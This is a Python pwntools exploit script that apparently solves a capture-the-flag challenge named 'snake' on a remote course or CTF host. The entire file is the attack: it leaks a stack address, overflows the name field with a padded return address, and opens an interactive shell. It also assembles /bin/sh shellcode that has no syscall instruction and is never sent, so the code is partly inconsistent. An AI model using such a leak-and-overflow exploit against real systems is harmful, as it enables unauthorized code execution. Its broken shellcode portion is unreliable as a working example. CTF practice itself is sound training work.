#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf

    prog  = "./snake"

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 4002

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

    return p

def set_name(name):
    p.sendlineafter(">", "1")
    p.sendline(name)

def print_flag(payload):
    p.sendlineafter(">", "3")
    p.sendlineafter("\n", payload)
    p.recvuntil("offset ")

    return int(p.recvuntil("\n", drop=True), 16)

start()

address = print_flag("B" * 0x61)

shellcode = asm("""
    push 0x0068732f
    push 0x6e69622f

    mov eax, 0xb
    mov ebx, esp
    mov ecx, 0x0
    mov edx, 0x0
    mov esi, 0x0
""")

payload = b"C" * 0x36
payload += p32(address - 0x64)
set_name(payload)

p.interactive()